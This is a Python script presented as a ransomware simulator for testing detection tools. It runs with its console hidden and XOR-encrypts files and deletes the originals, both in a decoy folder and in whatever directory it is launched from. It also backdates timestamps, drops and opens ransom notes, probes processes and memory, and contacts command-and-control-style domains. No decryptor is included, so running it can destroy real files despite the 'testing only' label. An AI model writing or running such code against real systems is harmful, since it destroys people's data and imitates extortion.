"""
Ransomware Behavior Simulator - DEMO VERSION
For ML-based Detection System Testing Only
Runs silently for professional demonstrations
"""

import os
import sys
import socket
import time
import subprocess
import threading
from pathlib import Path
from datetime import datetime
import ctypes

# Silent configuration - no console output for demo
SILENT_MODE = True
TEST_EXTENSION = ".LOCKED"
RANSOM_NOTE = "README_DECRYPT.txt"

class RansomwareSimulator:
    def __init__(self):
        self.encrypted_files = []
        self.desktop_path = Path.home() / "Desktop"
        self.test_dir = self.desktop_path / "test"
        self.current_dir = Path.cwd()
        self.ransom_dirs = []
        
    def hide_console(self):
        """Hide console window on Windows"""
        if sys.platform == "win32":
            try:
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            except:
                pass
    
    def create_ransom_note(self, directory):
        """Create realistic ransom note"""
        note_content = """
╔══════════════════════════════════════════════════════════════╗
║                   YOUR FILES HAVE BEEN ENCRYPTED              ║
╚══════════════════════════════════════════════════════════════╝

What happened to your files?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

All your important files have been encrypted with military-grade
encryption algorithms. Without our decryption key, recovery is
IMPOSSIBLE.

Files affected:
  • Documents
  • Photos  
  • Videos
  • Databases
  • Archives

How to decrypt your files?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
        
        note_path = Path(directory) / RANSOM_NOTE
        try:
            with open(note_path, "w", encoding="utf-8") as f:
                f.write(note_content)
            self.ransom_dirs.append(note_path)
        except:
            pass
    
    def open_ransom_notes(self):
        """Open ransom notes in notepad (Event 1)"""
        for note_path in self.ransom_dirs:
            try:
                if sys.platform == "win32":
                    subprocess.Popen(["notepad.exe", str(note_path)])
                    time.sleep(0.5)
            except:
                pass
    
    def process_injection_simulation(self):
        """Event 8: Remote Thread Creation, Event 10: Process Access"""
        if sys.platform != "win32":
            return
        
        try:
            import ctypes
            from ctypes import wintypes
            
            # Windows API constants
            PROCESS_ALL_ACCESS = 0x1F0FFF
            VIRTUAL_MEM = 0x1000 | 0x2000
            PAGE_EXECUTE_READWRITE = 0x40
            
            kernel32 = ctypes.windll.kernel32
            
            # Get current process (safe - our own process)
            current_pid = os.getpid()
            
            # Event 10: Process Access
            h_process = kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                current_pid
            )
            
            if h_process:
                # Event 8: Remote thread simulation (in our own process - safe)
                # This triggers the Sysmon event without being malicious
                
                # Allocate memory in our own process
                lpBaseAddress = kernel32.VirtualAllocEx(
                    h_process,
                    None,
                    1024,
                    VIRTUAL_MEM,
                    PAGE_EXECUTE_READWRITE
                )
                
                if lpBaseAddress:
                    # Write harmless data
                    test_data = b"TEST" * 10
                    kernel32.WriteProcessMemory(
                        h_process,
                        lpBaseAddress,
                        test_data,
                        len(test_data),
                        None
                    )
                    
                    # Clean up
                    kernel32.VirtualFreeEx(h_process, lpBaseAddress, 0, 0x8000)
                
                kernel32.CloseHandle(h_process)
        except:
            pass
    
    def enumerate_processes(self):
        """Event 10: Process Access - enumerate running processes"""
        if sys.platform != "win32":
            return
        
        try:
            import ctypes
            from ctypes import wintypes
            
            kernel32 = ctypes.windll.kernel32
            psapi = ctypes.windll.psapi
            
            # Enumerate processes
            process_ids = (wintypes.DWORD * 1024)()
            cb_needed = wintypes.DWORD()
            
            if psapi.EnumProcesses(
                ctypes.byref(process_ids),
                ctypes.sizeof(process_ids),
                ctypes.byref(cb_needed)
            ):
                count = cb_needed.value // ctypes.sizeof(wintypes.DWORD)
                
                # Access first 10 processes (triggers Event 10)
                for i in range(min(10, count)):
                    pid = process_ids[i]
                    if pid > 0:
                        h_process = kernel32.OpenProcess(0x1000, False, pid)  # QUERY_INFORMATION
                        if h_process:
                            kernel32.CloseHandle(h_process)
        except:
            pass
    
    def network_beacon(self):
        """Event 3 & 22: Network connections and DNS queries"""
        domains = [
            "command-control-srv.onion.to",
            "payment-gateway-crypto.com", 
            "data-exfil-node-47.net",
            "decryption-service.onion.link"
        ]
        
        for domain in domains:
            try:
                socket.gethostbyname(domain)
            except:
                pass
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((domain, 443))
                s.close()
            except:
                pass
            
            time.sleep(0.3)
    
    def modify_registry(self):
        """Event 13: Registry modifications"""
        if sys.platform != "win32":
            return
        
        try:
            import winreg
            
            # Access common registry keys (read-only for safety)
            keys_to_access = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion"),
                (winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop"),
            ]
            
            for hive, path in keys_to_access:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
                    winreg.CloseKey(key)
                except:
                    pass
        except:
            pass
    
    def create_named_pipe(self):
        """Event 17: Named pipe creation"""
        if sys.platform != "win32":
            return
        
        try:
            import win32pipe
            import win32file
            
            pipe_name = r"\\.\pipe\RansomComm" + str(os.getpid())
            
            pipe = win32pipe.CreateNamedPipe(
                pipe_name,
                win32pipe.PIPE_ACCESS_DUPLEX,
                win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_WAIT,
                1, 65536, 65536, 300, None
            )
            
            if pipe:
                time.sleep(0.5)
                win32file.CloseHandle(pipe)
        except:
            pass
    
    def timestamp_stomp(self, filepath):
        """Event 2: File timestamp modification"""
        try:
            stat_info = os.stat(filepath)
            old_time = stat_info.st_mtime - (86400 * 365)  # 1 year back
            os.utime(filepath, (old_time, old_time))
        except:
            pass
    
    def encrypt_file(self, filepath):
        """Event 11, 26: Encrypt and delete original"""
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            
            # XOR encryption
            encrypted = bytes([b ^ 0x7F for b in data])
            
            # Write encrypted file
            enc_path = Path(str(filepath) + TEST_EXTENSION)
            with open(enc_path, "wb") as f:
                f.write(encrypted)
            
            # Timestamp manipulation
            self.timestamp_stomp(enc_path)
            
            # Delete original
            os.remove(filepath)
            
            self.encrypted_files.append(enc_path)
        except:
            pass
    
    def recursive_encrypt(self, directory, max_depth=2, current_depth=0):
        """Recursively encrypt files"""
        if current_depth >= max_depth:
            return
        
        try:
            for item in Path(directory).iterdir():
                if item.is_file():
                    # Encrypt common file types
                    if item.suffix.lower() in ['.txt', '.doc', '.docx', '.pdf', 
                                                '.xls', '.xlsx', '.csv', '.jpg', 
                                                '.png', '.zip']:
                        if TEST_EXTENSION not in item.name:
                            self.encrypt_file(item)
                            time.sleep(0.1)
                
                elif item.is_dir() and not item.name.startswith('.'):
                    self.recursive_encrypt(item, max_depth, current_depth + 1)
        except:
            pass
    
    def setup_persistence(self):
        """Create test files for encryption"""
        self.test_dir.mkdir(exist_ok=True)
        
        # Create sample files
        sample_files = {
            "Financial_Report_2024.xlsx": "Budget,Revenue,Expenses\n2024,150000,75000\n",
            "Client_Database.csv": "Name,Email,Phone\nJohn Doe,john@email.com,555-0100\n",
            "Project_Proposal.docx": "CONFIDENTIAL PROJECT PROPOSAL\n" * 20,
            "Company_Secrets.txt": "Important confidential information\n" * 15,
            "Backup_Codes.txt": "Recovery code: ABC-123-XYZ\n" * 10,
        }
        
        for filename, content in sample_files.items():
            filepath = self.test_dir / filename
            try:
                with open(filepath, "w") as f:
                    f.write(content)
            except:
                pass
    
    def execute(self):
        """Main execution"""
        # Hide console for demo
        if SILENT_MODE:
            self.hide_console()
        
        # Create test environment
        self.setup_persistence()
        time.sleep(0.5)
        
        # System interactions
        self.modify_registry()
        self.create_named_pipe()
        
        # Process activities (Events 8, 10)
        self.process_injection_simulation()
        self.enumerate_processes()
        
        # Network activity (Events 3, 22)
        network_thread = threading.Thread(target=self.network_beacon)
        network_thread.daemon = True
        network_thread.start()
        
        # File encryption
        self.recursive_encrypt(self.test_dir, max_depth=2)
        self.recursive_encrypt(self.current_dir, max_depth=1)
        
        # Create ransom notes
        self.create_ransom_note(self.desktop_path)
        self.create_ransom_note(self.current_dir)
        
        # Wait for network thread
        network_thread.join(timeout=3)
        
        # Display ransom notes
        time.sleep(1)
        self.open_ransom_notes()

if __name__ == "__main__":
    sim = RansomwareSimulator()
    sim.execute()